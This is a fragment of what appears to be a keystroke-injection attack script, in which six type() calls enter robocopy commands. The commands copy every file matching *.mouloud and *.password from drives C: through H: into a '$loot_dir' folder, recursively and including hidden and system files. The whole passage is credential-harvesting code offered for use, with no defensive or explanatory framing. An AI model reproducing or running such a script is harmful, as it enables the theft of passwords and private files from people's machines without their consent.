...
type('robocopy d:\\ $loot_dir *.mouloud *.password /A-:SH /S /MT /Z\n')
type('robocopy e:\\ $loot_dir *.mouloud *.password /A-:SH /S /MT /Z\n')
type('robocopy f:\\ $loot_dir *.mouloud *.password /A-:SH /S /MT /Z\n')
type('robocopy g:\\ $loot_dir *.mouloud *.password /A-:SH /S /MT /Z\n')
type('robocopy h:\\ $loot_dir *.mouloud *.password /A-:SH /S /MT /Z\n')
type('robocopy c:\\ $loot_dir *.mouloud *.password /A-:SH /S /MT /Z\n')
